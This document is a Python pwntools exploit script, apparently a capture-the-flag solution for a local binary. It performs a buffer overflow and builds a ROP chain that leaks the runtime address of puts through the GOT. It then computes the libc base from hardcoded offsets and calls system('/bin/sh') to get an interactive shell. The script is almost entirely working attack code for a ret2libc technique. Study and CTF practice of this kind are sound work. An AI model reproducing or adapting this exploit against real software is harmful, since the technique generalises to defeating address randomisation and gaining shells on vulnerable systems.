from pwn import *
from time import sleep
import sys 

#first part - leak address
p =process('./executable')
context(os="linux",arch="amd64")

plt_main = p64(0x400626)
pop_rdi = p64(0x4006d3)
junk = "A" * 72

plt_put = p64(0x4004e0)
got_put = p64(0x601018)

payload = junk + pop_rdi + got_put + plt_put + plt_main
p.recvuntil("ROP me outside, how 'about dah?")
p.sendline(payload)
leak = u64(p.recvline().ljust(8, "\x00"))
leaked_puts = p.recv().split('\n')[0] + "\x00\x00"
leaked_puts = u64(leaked_puts)

print "Leaked puts:" + str(hex(leaked_puts))

#second part - use leaked address to preform ret2libc
libc_puts = 0x809c0
libc_sys  = 0x4f440
libc_sh = 0x1b3e9a

offset = leaked_puts - libc_puts
sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)

payload = junk + pop_rdi + sh +sys
p.sendline(payload)
p.interactive()
